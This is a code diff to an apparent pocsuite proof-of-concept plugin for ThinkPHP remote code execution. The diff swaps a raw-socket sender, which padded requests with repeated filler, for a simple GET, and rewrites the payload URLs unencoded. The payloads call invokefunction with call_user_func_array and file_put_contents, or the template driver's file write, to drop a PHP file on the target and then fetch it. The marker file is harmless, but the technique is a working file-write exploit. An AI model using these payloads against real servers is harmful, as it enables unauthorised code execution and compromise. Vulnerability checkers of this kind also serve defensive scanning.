@@ -3,7 +3,6 @@
 from pocsuite.api.poc import register
 from pocsuite.api.poc import Output, POCBase
 import urlparse
-import socket
 from pocsuite.api.request import req
 from pocsuite.api.utils import randomStr
 
@@ -30,31 +29,7 @@ class TestPOC(POCBase):
     def _verify(self):
         def vul_check(payload):
             url = urlparse.urljoin(base_url, payload)
-            sock = socket.socket()
-            sock.connect(("127.0.0.1",8080))
-            sock.send('GET /{} HTTP/1.0\r\n'.format(payload).encode('ascii'))
-            sock.send('Host: 127.0.0.1\r\n'.encode('ascii'))
-            sock.send('\r\n'.encode('ascii'))
-            str_five = 'testssdfsf' * 200
-            sock.send(str_five.encode('ascii'))
-            sock.send(str_five.encode('ascii'))
-            sock.send(str_five.encode('ascii'))
-            sock.send(str_five.encode('ascii'))
-            sock.send(str_five.encode('ascii'))
-            sock.send(str_five.encode('ascii'))
-            sock.send(str_five.encode('ascii'))
-            sock.send(str_five.encode('ascii'))
-            sock.send(str_five.encode('ascii'))
-            sock.send(str_five.encode('ascii'))
-            sock.send(str_five.encode('ascii'))
-            sock.send(str_five.encode('ascii'))
-            sock.send(str_five.encode('ascii'))
-            sock.send(str_five.encode('ascii'))
-            sock.send(str_five.encode('ascii'))
-            sock.send(str_five.encode('ascii'))
-            sock.send(str_five.encode('ascii'))
-            sock.send(str_five.encode('ascii'))
-            sock.close()
+            create_verify_file = req.get(url)
             get_verify_str = req.get(verify_url)
             return get_verify_str
 
@@ -66,9 +41,9 @@ class TestPOC(POCBase):
         verify_filename = randomStr(3)
         verify_url = urlparse.urljoin(base_url, verify_filename+".php")
         payload_list = [
-            "index.php?s=index/think%5Capp/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]={}.php&vars[1][]=%3C?php%20echo%20\'{}\';?%3E".format(
+            "index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]={}.php&vars[1][]=<?php echo '{}';?>".format(
                 verify_filename, verify_str),
-            "index.php?s=index/\\think\\template\driver\\file/write?cacheFile={}.php&content=%3Cphp%20echo%20\'{}\';?%3E".format(
+            "index.php?s=index/\\think\\template\driver\\file/write?cacheFile={}.php&content=<?php echo '{}';?>".format(
                 verify_filename, verify_str)
         ]
         if any(verify_str in vul_check(x) for x in payload_list):
